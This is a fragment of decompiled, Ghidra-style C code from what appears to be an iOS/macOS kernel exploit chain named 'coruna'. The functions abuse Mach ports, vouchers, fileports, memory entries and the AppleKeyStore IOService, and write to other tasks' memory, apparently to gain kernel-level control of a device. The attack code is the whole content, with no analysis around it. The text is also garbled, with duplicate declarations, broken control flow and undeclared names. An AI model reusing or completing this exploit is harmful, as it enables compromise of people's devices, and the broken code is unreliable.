    if ((u & 0xffc) != 0) {
      _thread_switch(*(mach_port_name_t *)(handle + 0x14),0,0);
    }
    err = *(int *)(handle + 0x14);
  }
  return;
}
void coruna_ioservicegetmatchingservice(long *handle,uint32_t *size)
{
  uint32_t u;
  uint64_t size;
  long handle;
  uint64_t scratch;
  uint64_t bootargs;
  
  u = *(uint32_t *)k_kernel_kiomasterportdefault_slot;
  size = _IOServiceMatching("AppleKeyStore");
  size = _IOServiceGetMatchingService(u,size);
  _IOServiceOpen(size,*(uint32_t *)k_kernel_mach_task_self_slot,0,size);
  handle = coruna_ret_stub_3(*handle,*size);
  size = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*handle,handle + 0x48);
  *(uint64_t *)(size + 6) = size;
  size = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*handle,handle);
  *(uint64_t *)(size + 8) = size;
  coruna_kernel509_via_fn_ptr_cast_10_10(*(uint64_t *)(*handle + 0x20),size);
  bootargs = k_kernel_rodata_word_00043428;
  scratch = k_kernel_rodata_word_43420;
  coruna_kernel509_via_helper_5d2c_419fc_2(*(uint64_t *)(*(long *)handle[1] + 8),(long *)handle[1],k_kernel_rodata_word_480a0,2,&scratch
              );
}





void coruna_kernel509_via_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614_2(long *handle,uint32_t *size)
{
  long handle;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  
  bootargs = *(uint64_t *)k_kernel_stack_chk_guard_slot;
  handle = coruna_ret_stub_3(*handle,*size);
  coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614(*handle,handle + 0x48,*(uint64_t *)(size + 6),1);
  coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614(*handle,handle,*(uint64_t *)(size + 8),1);
  coruna_call_mach_vm_machine_attribute(*handle,handle + 0x9c,0,1);
  coruna_mach_port_deallocate_2b24c(*(uint64_t *)(*handle + 0x20),size + 10);
  scratch = *(uint64_t *)(size + 2);
  scratch = 0x4000;
  coruna_kernel509_via_helper_5d2c_419fc_2(*(uint64_t *)(*(long *)handle[1] + 8),(long *)handle[1],k_kernel_rodata_word_480a8,2,&scratch)
  ;
}
void coruna_call_indirect_b0fc_1cc0c(long handle)
{
  uint64_t scratch;
  uint64_t scratch;
  
  scratch = k_kernel_rodata_word_00043428;
  scratch = k_kernel_rodata_word_43420;
  coruna_kernel509_via_helper_5d2c_419fc_2(*(uint64_t *)(**(long **)(handle + 8) + 8),*(long **)(handle + 8),k_kernel_rodata_word_480a0,2,
               &scratch);
}
void coruna_thread_policy_set_1ccfc(long handle,uint64_t *val)
{
  mach_port_t lm1;
  long *ptr;
  unsigned long u;
  uint64_t scratch;
  uint64_t scratch;
  
  ptr = (long *)*val;
  while (*ptr != 0) {
    _sched_yield();
    ptr = (long *)*val;
  }
  u = tpidr_el0;
  while ((u & 0xffc) != 0) {
    lm1 = _mach_thread_self();
    _thread_switch(lm1,0,0);
    u = tpidr_el0;
  }
  scratch = k_kernel_rodata_word_00043438;
  scratch = k_kernel_rodata_word_43430;
  lm1 = _mach_thread_self();
  _thread_policy_set(lm1,2,(thread_policy_t)&scratch,4);
  coruna_kernel509_via_helper_5d2c_419fc_2(*(uint64_t *)(handle + 8),0x35);
}
void coruna_thread_policy_set_1cde0(long handle)
{
  mach_port_t thread;
  char *ptr;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t thread_attr;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t host_info;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t serial_buf;
  uint64_t path_buf;
  long action;
  
  action = *(long *)k_kernel_stack_chk_guard_slot;
  ptr = _strstr(k_kernel_rodata_word_480d8,"T8020");
  if (ptr == (char *)0x0) {
    stack_guard = 0;
    host_info = 0;
    sa_new = 0;
    sa_saved = 0;
    serial_buf = 0;
    thread_attr = 0;
    block_ctx = 0;
    action = 0;
    bootargs = 0;
    bootargs = 0;
    host_info = 0;
    thread_attr = 0;
    coruna_ioservicegetmatchingservice(handle,&bootargs);
    scratch = k_kernel_rodata_word_00043448;
    scratch = k_kernel_rodata_word_43440;
    thread = _mach_thread_self();
    _thread_policy_set(thread,2,(thread_policy_t)&scratch,4);
    path_buf = k_kernel_rodata_word_00043428;
    serial_buf = k_kernel_rodata_word_43420;
    coruna_kernel509_via_helper_5d2c_419fc_2(*(uint64_t *)(**(long **)(handle + 8) + 8),*(long **)(handle + 8),k_kernel_rodata_word_480a0,
                 2,&serial_buf);
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != action) {
    ___stack_chk_fail(5);
  }
  return;
}





void coruna_call_indirect_b0fc_1d5bc(long handle)
{
  coruna_kernel509_via_helper_5d2c_419fc_2(*(uint64_t *)(handle + 0x10));
}
void coruna_call_thread_switch_1c404(long handle)
{
  coruna_thread_switch_1c404(*(uint64_t *)(handle + 0x20));
  return;
}
void coruna_call_thread_policy_set_1ccfc(long handle)
{
  coruna_thread_policy_set_1ccfc(*(uint64_t *)(handle + 0x20),handle + 0x28);
  return;
}
void coruna_vm_read_overwrite(uint64_t val)
{
  unsigned long *address;
  int err;
  kern_return_t lk2;
  vm_map_t target_task;
  vm_size_t scratch;
  unsigned long bootargs;
  long thread_attr;
  
  err = coruna_task_info(val,&thread_attr);
  if (err == 0) {
    address = (unsigned long *)(thread_attr + 0x28);
    target_task = (vm_map_t)val;
    if (*(vm_map_t *)k_kernel_mach_task_self_slot == target_task) {
      *address = *address | 1;
    }
    else {
      lk2 = _vm_read_overwrite(target_task,(vm_address_t)address,8,(vm_address_t)&bootargs,
                                 &scratch);
      if (lk2 == 0) {
        bootargs = bootargs | 1;
        _vm_write(target_task,(vm_address_t)address,(vm_offset_t)&bootargs,8);
      }
    }
  }
  return;
}
void coruna_task_info(task_name_t arg,long *handle)
{
  kern_return_t lk1;
  mach_msg_type_number_t scratch;
  long bootargs [3];
  
  scratch = 5;
  lk1 = _task_info(arg,0x11,(task_info_t)bootargs,&scratch);
  if ((lk1 == 0) && (bootargs[0] != 0)) {
    *handle = bootargs[0];
  }
  return;
}
void coruna_kernel509_via_task_info(uint64_t val,uint64_t id_2)
{
  int err;
  uint8_t scratch[8];
  
  err = coruna_kernel5_residual_228(id_2);
  if (-1 < err) {
    coruna_task_info(*(uint32_t *)k_kernel_mach_task_self_slot,scratch);
  }
  return;
}
void coruna_kernel5_residual_228(int flags)
{
  if (flags < 0x12) {
    if (flags < 4) {
      if (flags < 2) {
        if (flags == 0) {
          return;
        }
        if (flags == 1) {
          return;
        }
      }
      else {
        if (flags == 2) {
          return;
        }
        if (flags == 3) {
          return;
        }
      }
    }
    else if (flags < 0x10) {
      if (flags == 4) {
        return;
      }
      if (flags == 5) {
        return;
      }
    }
    else {
      if (flags == 0x10) {
        return;
      }
      if (flags == 0x11) {
        return;
      }
    }
  }
  else if (flags < 0x16) {
    if (flags - 0x13U < 2) {
      return;
    }
    if (flags == 0x12) {
      return;
    }
    if (flags == 0x15) {
      return;
    }
  }
  else {
    if (flags - 0x17U < 2) {
      return;
    }
    if (flags == 0x19) {
      return;
    }
    if (flags == 0x16) {
      return;
    }
  }
  return;
}
void coruna_mach_port_mod_refs(long handle,unsigned long arg,mach_port_name_t *arg_x)
{
  kern_return_t lk1;
  int err;
  mach_port_name_t *lpm3;
  uint64_t u;
  long scratch;
  mach_port_name_t bootargs;
  
  bootargs = 0;
  if (*(unsigned long *)(handle + 0x158) < 0x1f543c40800000) {
    err = coruna_host_create_mach_voucher(handle,(arg & 0xffffffff) + 0x1122334455667788,&bootargs);
    if (err == 0) {
      return;
    }
  }
  else {
    lpm3 = (mach_port_name_t *)coruna_kernel509_via_task_info(handle,arg);
    if (lpm3 == (mach_port_name_t *)0x0) {
      return;
    }
    bootargs = *lpm3;
    if (bootargs + 1 < 2) {
      scratch = 0;
      if ((int)arg - 0x13U < 2) {
        u = 0xc;
      }
      else {
        if ((int)arg != 0x10) {
          return;
        }
        u = 0xb;
      }
      err = coruna_kernel509_via_kernel509_via_vm_deallocate_2a1cc(handle,u,&scratch);
      if (err == 0) {
        return;
      }
      if (scratch == 0) {
        return;
      }
      err = coruna_mach_port_request_notification(handle,scratch,&bootargs);
      if (err != 0) {
        return;
      }
      if (bootargs + 1 < 2) {
        return;
      }
      lk1 = _mach_port_mod_refs(*(ipc_space_t *)k_kernel_mach_task_self_slot,bootargs,0,0xffff);
      if (lk1 != 0) {
        return;
      }
      *lpm3 = bootargs;
    }
    lk1 = _mach_port_mod_refs(*(ipc_space_t *)k_kernel_mach_task_self_slot,bootargs,0,1);
    if (lk1 != 0) {
      return;
    }
  }
  *arg_x = bootargs;
  return;
}
void coruna_mach_port_deallocate_139b0(uint64_t val,uint64_t id_2,vm_size_t arg,vm_address_t *arg_x)
{
  uint u;
  uint size;
  vm_inherit_t unaff_w22;
  mem_entry_name_port_t scratch;
  
  scratch = 0;
  u = coruna_mach_port_mod_refs(val,id_2,&scratch);
  if (u == 0) {
    if (1 < scratch + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,scratch);
    }
    return;
  }
  if (((u != 0) && (arg_x != (vm_address_t *)0x0)) && (*arg_x != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,*arg_x,arg);
    *arg_x = 0;
  }
fail:
  if (1 < scratch + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,scratch);
  }
  return;
}
void coruna_kernel5_via_mach_port_deallocate_139b0(long handle)
{
  int err;
  uint64_t u;
  uint64_t scratch;
  
  scratch = 0;
  u = *(uint64_t *)k_kernel_vm_page_size_slot;
  if (((*(long *)(handle + 0x118) == 0) || (*(long *)(handle + 0x120) == 0)) &&
     (err = coruna_mach_port_deallocate_139b0(handle,0x10,u,&scratch), err == 0)) {
    *(uint64_t *)(handle + 0x118) = scratch;
    *(uint64_t *)(handle + 0x120) = u;
  }
  return;
}
void coruna_mach_port_deallocate_13b50(uint *size,uint32_t *size_x)
{
  uint8_t *ptr;
  int err;
  uint u;
  unsigned long size;
  uint32_t version;
  uint *buf;
  long handle;
  mach_port_name_t *lpm8;
  uint64_t port;
  long addr;
  long off;
  stat scratch;
  uint32_t bootargs;
  uint thread_attr [2];
  uint64_t host_info;
  mach_port_name_t serial_buf [4];
  long action;
  
  action = *(long *)k_kernel_stack_chk_guard_slot;
  serial_buf[0] = 0;
  serial_buf[1] = 0;
  serial_buf[2] = 0;
  serial_buf[3] = 0;
  thread_attr[0] = 0xffffffff;
  thread_attr[1] = 0xffffffff;
  host_info = 0xffffffffffffffff;
  bootargs = 0xffffffff;
  if ((*(unsigned long *)(size + 0x56) < 0x1c1b0a80100000) || ((*size & 0x5584001) == 0)) {
    addr = 3;
    if (*(unsigned long *)(size + 0x56) < 0x1f530000000000) {
      addr = 4;
    }
  }
  else {
    addr = 3;
  }
  err = coruna_open_dev_null(&bootargs);
  ptr = k_kernel_mach_task_self_slot;
  if (err == 0) {
    handle = 0x1122334455667788;
    lpm8 = serial_buf;
    buf = thread_attr;
    off = addr;
    do {
      err = coruna_host_create_mach_voucher(size,handle,lpm8);
      if (err != 1) goto fail;
      u = coruna_fileport_makefd(*lpm8);
      *buf = u;
      _mach_port_deallocate(*(ipc_space_t *)ptr,*lpm8);
      *lpm8 = 0;
      if ((int)*buf < 0) goto fail;
      handle = handle + 1;
      lpm8 = lpm8 + 1;
      buf = buf + 1;
      off = off + -1;
    } while (off != 0);
    err = coruna_kernel5_via_fcntl(thread_attr);
    if (err == 0) {
      size[0x64c] = thread_attr[0];
      size[0x64d] = thread_attr[1];
      if ((*(unsigned long *)(size + 0x56) < 0x1c1b0a80100000) ||
         (((*size & 0x5584001) == 0 && (*(unsigned long *)(size + 0x56) < 0x1f530000000000)))) {
        *(uint64_t *)(size + 0x64e) = host_info;
      }
      else {
        size[0x650] = (uint)host_info;
      }
      err = _fstat(thread_attr[1],&scratch);
      if (err == 0) {
        addr = coruna_fn_ptr_cast_2(size,scratch.st_atimespec.tv_sec);
        if (addr != 0) {
          *(__darwin_time_t *)(size + 0x674) = scratch.st_atimespec.tv_sec;
        }
        if ((*(unsigned long *)(size + 0x56) < 0x1c1b0a80100000) ||
           (((*size & 0x5584001) == 0 && (*(unsigned long *)(size + 0x56) < 0x1f530000000000)))) {
          if ((scratch.st_atimespec.tv_nsec != 0) &&
             ((*(unsigned long *)(size + 0x62) & scratch.st_atimespec.tv_nsec) == 0)) {
            *(long *)(size + 0x678) = scratch.st_atimespec.tv_nsec;
          }
        }
        else {
          size = scratch.st_atimespec.tv_nsec | 0xffffff0000000000;
          addr = coruna_fn_ptr_cast_2(size,size);
          if (addr != 0) {
            *(unsigned long *)(size + 0x86) = size;
          }
          size = ((unsigned long)scratch.st_atimespec.tv_nsec >> 0x28) * (unsigned long)size[0x60];
          if ((size != 0) && ((*(unsigned long *)(size + 0x62) & size) == 0)) {
            *(unsigned long *)(size + 0x678) = size;
          }
          if ((((size[0x64c] != 0xffffffff) && (size[0x64d] != 0xffffffff)) &&
              (size[0x650] != 0xffffffff)) &&
             (((*(long *)(size + 0x86) != 0 && (0x1c1b19145fffff < *(unsigned long *)(size + 0x56)))
              && (err = coruna_kernel5_via_mach_port_deallocate_139b0(size), err == 0)))) {
            port = *(uint64_t *)(*(long *)(size + 0x46) + 0x100);
            addr = coruna_fn_ptr_cast_2(size,port);
            if (addr != 0) {
              *(uint64_t *)(size + 0x88) = port;
            }
          }
        }
      }
      coruna_kernel5_residual_236(size + 0x64c);
      size = coruna_close(bootargs);
      version = 1;
      *size_x = version;
      if (*(long *)k_kernel_stack_chk_guard_slot != action) {
      ___stack_chk_fail(size);
      }
      return;
    }
fail:
    coruna_close(bootargs);
  }
  buf = thread_attr;
  do {
    u = *buf;
    if (u != 0xffffffff) {
      u = _close(u);
    }
    size = (unsigned long)u;
    buf = buf + 1;
    addr = addr + -1;
  } while (addr != 0);
  version = 0;
done:
  *size_x = version;
  if (*(long *)k_kernel_stack_chk_guard_slot != action) {
    ___stack_chk_fail(size);
  }
  return;
}
void coruna_mach_port_deallocate_13e94(long handle,uint32_t *size)
{
  long *ptr;
  mach_port_name_t name;
  uint8_t *ptr;
  bool err;
  int err;
  uint u;
  kern_return_t lk6;
  unsigned long size;
  mach_port_name_t *lpm8;
  unsigned long size;
  uint32_t version;
  mach_port_name_t *lpm10;
  uint64_t port;
  long handle;
  vm_inherit_t in_stack_ffffffffffffff70;
  uint32_t scratch;
  uint64_t *bootargs;
  vm_address_t thread_attr [3];
  mem_entry_name_port_t host_info [4];
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  host_info[2] = 0;
  host_info[0] = 0;
  host_info[1] = 0;
  thread_attr[0] = 0;
  size = *(unsigned long *)k_kernel_vm_page_size_slot;
  bootargs = (uint64_t *)0x0;
  scratch = 0xffffffff;
  err = coruna_open_dev_null(&scratch);
  ptr = k_kernel_mach_task_self_slot;
  size = 0;
  if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
  return;
  }
  ___stack_chk_fail(size);
}
void coruna_mach_port_deallocate_141e8(long handle,mach_port_name_t *arg,uint64_t val)
{
  int err;
  kern_return_t lk2;
  long handle;
  long addr;
  long off;
  uint scratch;
  uint8_t bootargs[4];
  long thread_attr;
  
  err = *(int *)(handle + 0x140);
  off = 0x38;
  if (err < 0x1f53) {
    if (err != 0x1809 && err != 0x1c1b) {
      return;
    }
  }
  else if (1 < err - 0x1f53U) {
    if (err != 0x2258) {
      return;
    }
    off = 0x30;
  }
  handle = coruna_call_helper_25fa0(handle,*arg);
  if ((((handle != 0) && (err = coruna_kernel509_via_mach_vm_read_overwrite(handle,handle,&scratch), err != 0)) &&
      ((scratch & 0x3ff) == 0x25)) && (addr = coruna_kernel509_via_fn_ptr_cast_2_4(handle,handle), addr != 0)) {
    err = coruna_kernel509_residual_307(handle,addr + off,&thread_attr);
    if ((err != 0) && (handle == thread_attr)) {
      err = coruna_kernel509_via_mach_vm_read_overwrite(handle,addr + 8,bootargs);
      if ((err != 0) &&
         ((err = coruna_mach_vm_machine_attribute(handle,addr + 8,0xffff), err != 0 &&
          (lk2 = _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,*arg),
          lk2 == 0)))) {
        *arg = 0;
        handle = coruna_call_helper_25fa0(handle,val);
        if ((handle != 0) && (err = coruna_call_mach_vm_machine_attribute_1d4f8_2b508(handle,addr + off,handle), err != 0)) {
          coruna_kernel509_via_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_8(handle,handle);
        }
      }
    }
  }
  return;
}
void coruna_mach_port_deallocate_14398(long handle,unsigned long arg,uint64_t val)
{
  int err;
  kern_return_t lk2;
  mach_port_name_t *lpm3;
  long handle;
  uint64_t u;
  long scratch;
  mach_port_name_t bootargs;
  
  bootargs = 0;
  if (*(unsigned long *)(handle + 0x158) < 0x1f543c40800000) {
    err = coruna_host_create_mach_voucher(handle,(arg & 0xffffffff) + 0x1122334455667788,&bootargs);
    if (err != 0) {
      coruna_mach_port_deallocate_141e8(handle,&bootargs,val);
    }
    if (1 < bootargs + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,bootargs);
    }
    return;
  }
  scratch = 0;
  lpm3 = (mach_port_name_t *)coruna_kernel509_via_task_info(handle,arg);
  if (((lpm3 == (mach_port_name_t *)0x0) || (handle = coruna_call_helper_25fa0(handle,val), handle == 0))
     if (1 < bootargs + 1) {
     _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,bootargs);
     }
     return;
}
void coruna_mach_make_memory_entry(uint64_t val,uint64_t id_2,size_t len,vm_offset_t arg,
                 vm_address_t *arg_x)
{
  uint8_t *ptr;
  bool err;
  uint u;
  kern_return_t lk4;
  vm_inherit_t in_stack_ffffffffffffff90;
  size_t scratch;
  mem_entry_name_port_t bootargs;
  vm_offset_t thread_attr;
  
  ptr = k_kernel_mach_task_self_slot;
  bootargs = 0;
  err = arg == 0;
  scratch = len;
  thread_attr = arg;
  if ((arg == 0) &&
     (lk4 = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&thread_attr,len,1),
     lk4 != 0)) {
    err = false;
    if (1 < bootargs + 1) {
    _mach_port_deallocate(*(ipc_space_t *)ptr,bootargs);
    }
    if (err) {
    _vm_deallocate(*(vm_map_t *)ptr,thread_attr,len);
    }
    return;
  }
  u = _mach_make_memory_entry(*(vm_map_t *)ptr,&scratch,thread_attr,3,&bootargs,0);
  if (u == 0) {
    if (scratch == len) {
      u = coruna_mach_port_deallocate_14398(val,id_2,bootargs);
      if ((u == 0) && (arg == 0)) {
        u = _vm_map(*(vm_map_t *)ptr,arg_x,len,0,1,bootargs,0,0,3,2,
                        in_stack_ffffffffffffff90);
        if (u == 0) {
          _bzero((void *)*arg_x,len);
          if (1 < bootargs + 1) {
          _mach_port_deallocate(*(ipc_space_t *)ptr,bootargs);
          }
          if (err) {
          _vm_deallocate(*(vm_map_t *)ptr,thread_attr,len);
          }
          return;
        }
        goto done;
      }
    }
    else {
      u = 0xad022;
    }
  }
  else {
done:
    u = u | 0x80000000;
  }
  if ((u != 0 && arg == 0) && (*arg_x != 0)) {
    _vm_deallocate(*(vm_map_t *)ptr,*arg_x,len);
  }
fail:
  if (1 < bootargs + 1) {
    _mach_port_deallocate(*(ipc_space_t *)ptr,bootargs);
  }
  if (err) {
    _vm_deallocate(*(vm_map_t *)ptr,thread_attr,len);
  }
  return;
}
void coruna_kernel09_via_mach_make_memory_entry(long handle)
{
  uint8_t *ptr;
  int err;
  uint64_t u;
  uint64_t scratch;
  
  ptr = k_kernel_vm_page_size_slot;
  scratch = 0;
  err = coruna_mach_make_memory_entry((int)handle,0x10,*(uint64_t *)k_kernel_vm_page_size_slot,0,&scratch);
  if (err == 0) {
    u = *(uint64_t *)ptr;
    *(uint64_t *)(handle + 0x118) = scratch;
    *(uint64_t *)(handle + 0x120) = u;
  }
  return;
}
void coruna_mach_port_deallocate_1476c(uint *size)
{
  uint8_t *ptr;
  int err;
  uint64_t u;
  long handle;
  unsigned long size;
  uint version;
  long addr;
  long off;
  long base;
  long scratch;
  mach_port_name_t bootargs;
  uint thread_attr;
  uint host_info [4];
  uint32_t serial_buf[4];
  long action;
  
  action = *(long *)k_kernel_stack_chk_guard_slot;
  off = 0x1122334455667788;
  u = coruna_host_create_mach_voucher(size,0x1122334455667788,serial_buf);
  if ((((int)u != 0) && (handle = coruna_call_helper_25fa0(size,serial_buf[0]), u = 0, handle != 0)) &&
     (u = coruna_kernel509_via_mach_vm_read_overwrite(size,handle,&thread_attr), ptr = k_kernel_mach_task_self_slot,
     (int)u != 0)) {
    if ((thread_attr & 0x3ff) != 0x22) {
      u = 0;
      host_info[0] = size[0x64c];
      host_info[1] = size[0x64d];
      if (*(long *)k_kernel_stack_chk_guard_slot == action) {
      return;
      }
      ___stack_chk_fail(u);
    }
    u = 1;
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == action) {
    return;
  }
  ___stack_chk_fail(u);
}
void coruna_mach_make_memory_entry_14a20(long handle)
{
  uint8_t *ptr;
  kern_return_t lk2;
  uint u;
  int err;
  mach_port_name_t *lpm5;
  unsigned long size;
  mach_port_name_t *lpm7;
  long handle;
  size_t size;
  long addr;
  vm_inherit_t in_stack_ffffffffffffff60;
  mach_port_name_t lm10;
  mem_entry_name_port_t scratch;
  uint64_t *bootargs;
  size_t thread_attr;
  uint host_info;
  mach_port_name_t serial_buf [5];
  mem_entry_name_port_t action;
  long block_ctx;
  
  block_ctx = *(long *)k_kernel_stack_chk_guard_slot;
  size = *(size_t *)k_kernel_vm_page_size_slot;
  bootargs = (uint64_t *)0x0;
  thread_attr = size;
  if (*(unsigned long *)(handle + 0x158) < 0x1f543c40800000) {
    serial_buf[3] = 0;
    size = coruna_host_create_mach_voucher(handle,0x3122334455667788,serial_buf + 3);
    lm10 = serial_buf[3];
    if (*(long *)k_kernel_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail(size);
    }
    return;
  }
  else {
    lpm5 = (mach_port_name_t *)coruna_kernel509_via_task_info(handle,0);
    size = 0;
    if (*(long *)k_kernel_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail(size);
    }
    return;
  }
  serial_buf[0] = lm10;
  if (*(unsigned long *)(handle + 0x158) < 0x1f543c40800000) {
    addr = coruna_call_helper_25fa0(handle);
    size = 0;
    if ((addr == 0) || (size = coruna_kernel509_via_mach_vm_read_overwrite(handle,addr,&host_info), (int)size == 0))
    if (*(long *)k_kernel_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail(size);
    }
    return;
  }
  else if (lm10 + 1 < 2) {
done:
    ptr = k_kernel_mach_task_self_slot;
    err = *(int *)(handle + 0xe8);
    if (((((err + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
         (*(long *)(handle + 0x100) == 0)) ||
        ((lm10 = *(mach_port_name_t *)(handle + 0x114), lm10 + 1 < 2 ||
         (serial_buf[3] = lm10, serial_buf[4] = err, *(long *)(&k_kernel_slot_19d0 + handle) == 0)))) ||
       (*(long *)(handle + 0xf0) == 0)) {
cleanup:
      size = 0;
    }
    else {
      lk2 = _mach_make_memory_entry
                        (*(vm_map_t *)k_kernel_mach_task_self_slot,&thread_attr,0,0x20003,&scratch,0
                        );
      size = 0;
      if (lk2 == 0) {
        action = scratch;
        lk2 = _vm_map(*(vm_map_t *)ptr,(vm_address_t *)&bootargs,size,0,1,scratch,0,0,3,2,
                        in_stack_ffffffffffffff60);
        size = 0;
        if (lk2 == 0) {
          _bzero(bootargs,size);
          *bootargs = *(uint64_t *)(&k_kernel_slot_19d0 + handle);
          bootargs[1] = *(uint64_t *)(handle + 0xf0);
          *(int *)(bootargs + 2) = (int)*(uint64_t *)(handle + 0x108);
          *(uint32_t *)((long)bootargs + 0x14) = *(uint32_t *)(handle + 0x110);
          u = _vm_deallocate(*(vm_map_t *)ptr,(vm_address_t)bootargs,size);
          size = (unsigned long)u;
          addr = 0;
          lpm5 = serial_buf;
          do {
            if (*(unsigned long *)(handle + 0x158) < 0x1f543c40800000) {
              lm10 = 0;
              size = coruna_host_create_mach_voucher(handle,addr + 0x3122334455667788,&ghidra_stack_1);
              if ((int)size == 0) break;
              *lpm5 = lm10;
              size = coruna_mach_port_deallocate_141e8(handle,lpm5,serial_buf[addr + 3]);
              if ((int)size == 0) break;
            }
            else {
              lpm7 = (mach_port_name_t *)coruna_kernel509_via_task_info(size,addr);
              size = 0;
              if (lpm7 == (mach_port_name_t *)0x0) break;
              lm10 = serial_buf[addr + 3];
              handle = coruna_call_helper_25fa0(handle,lm10);
              size = 0;
              if (handle == 0) break;
              err = coruna_kernel509_via_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_8(handle,handle);
              if ((err != 0) ||
                 (lk2 = _mach_port_mod_refs(*(ipc_space_t *)ptr,lm10,0,0xffff), lk2 != 0))
              goto cleanup;
              *lpm7 = lm10;
            }
            addr = addr + 1;
            lpm5 = lpm5 + 1;
            size = 1;
          } while (addr != 3);
        }
      }
    }
    if (*(long *)k_kernel_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail(size);
    }
    return;
  }
  size = 1;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail(size);
  }
  return;
}
void coruna_mach_make_memory_entry_1ef2c(long handle)
{
  mach_port_name_t name;
  uint8_t *ptr;
  bool err;
  int err;
  kern_return_t lk4;
  int *err;
  mach_port_name_t *lpm6;
  bool status;
  size_t size;
  long handle;
  mem_entry_name_port_t scratch;
  uint64_t *address;
  size_t bootargs;
  mach_port_name_t thread_attr;
  mem_entry_name_port_t host_info;
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  size = *(size_t *)k_kernel_vm_page_size_slot;
  address = (uint64_t *)0x0;
  bootargs = size;
  if (0x1f543c407fffff < *(unsigned long *)(handle + 0x158)) {
    err = (int *)coruna_kernel509_via_task_info(handle,0);
    err = false;
    if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
    return;
    }
    ___stack_chk_fail(err);
  }
done:
  err = false;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
    return;
  }
  ___stack_chk_fail(err);
}
void coruna_mach_port_deallocate_1f1b8(long handle,uint *size)
{
  mach_port_name_t name;
  int err;
  uint8_t *ptr;
  bool err;
  kern_return_t lk4;
  int status;
  uint64_t u;
  mach_port_name_t *lpm7;
  bool status;
  unsigned long size;
  unsigned long version;
  vm_size_t size;
  int flags;
  long handle;
  int scratch;
  uint64_t *address;
  mach_port_name_t bootargs;
  mem_entry_name_port_t thread_attr;
  
  address = (uint64_t *)0x0;
  _local_58 = 0;
  size = *(vm_size_t *)k_kernel_vm_page_size_slot;
  scratch = -1;
  if ((0x1f543c407fffff < *(unsigned long *)(handle + 0x158)) &&
     (u = coruna_open_dev_null(&scratch), ptr = k_kernel_mach_task_self_slot, (int)u == 0)) {
    handle = 0;
    flags = 0x28026;
    err = true;
    do {
      status = err;
      lpm7 = (mach_port_name_t *)coruna_kernel509_via_task_info(u,handle);
      status = 0x28026;
      if (lpm7 == (mach_port_name_t *)0x0) goto fail;
      name = *lpm7;
      (&bootargs)[handle] = name;
      if ((name + 1 < 2) ||
         (lk4 = _mach_port_mod_refs(*(ipc_space_t *)ptr,name,0,1), status = flags, lk4 != 0))
      goto fail;
      handle = 1;
      u = 0;
      err = false;
    } while (status);
    lk4 = _vm_map(*(vm_map_t *)ptr,(vm_address_t *)&ghidra_stack_3,size,0,1,thread_attr,0
                    ,0,3,2,(vm_inherit_t)address);
    if (lk4 == 0) {
      u = *address;
      handle = coruna_fn_ptr_cast_2(handle,u);
      if (handle != 0) {
        *(uint64_t *)(&k_kernel_slot_19d0 + handle) = u;
        u = address[4];
        handle = coruna_fn_ptr_cast_2(handle,u);
        if (handle != 0) {
          *(uint64_t *)(&k_kernel_slot_1898 + handle) = u;
          if (address[5] - 1 < 0x20) {
            *(int *)(&k_kernel_slot_18a0 + handle) = (int)address[5];
            *(mach_port_name_t *)(handle + 0x58) = bootargs;
            size = address[6];
            if ((((size != 0) && ((size & 7) == 0)) &&
                (flags = *(int *)(address + 7), flags != 0)) &&
               (((version = address[8], version != 0 && ((version & 7) == 0)) &&
                (err = *(int *)(address + 9), err != 0)))) {
              *(unsigned long *)(handle + 0x80) = size;
              *(int *)(handle + 0x88) = flags;
              *(unsigned long *)(handle + 0xa0) = version;
              *(int *)(handle + 0xa8) = err;
              status = coruna_pthread_mach_thread_np_289c8(handle,1);
              if (status == 0) {
                coruna_close(scratch);
                scratch = -1;
                status = coruna_pthread_mach_thread_np_29b88(handle,0);
              }
            }
          }
        }
      }
    }
fail:
    if (scratch != -1) {
      coruna_close();
    }
    if (status != 0) {
      handle = 0;
      err = true;
      do {
        status = err;
        if (1 < (&bootargs)[handle] + 1) {
          _mach_port_deallocate(*(ipc_space_t *)ptr,(&bootargs)[handle]);
        }
        handle = 1;
        err = false;
      } while (status);
    }
    if (address != (uint64_t *)0x0 && size != 0) {
      _vm_deallocate(*(vm_map_t *)ptr,(vm_address_t)address,size);
    }
    *size = (uint)(status == 0);
  }
  return;
}
void coruna_open_m2scaler_1f43c(long handle,uint64_t val,long addr_2,uint64_t id_2,uint64_t size_3
                 ,uint64_t off_4,unsigned long *arg)
{
  long handle;
  uint u;
  uint size;
  int err;
  long addr;
  uint64_t version;
  long off;
  unsigned long port;
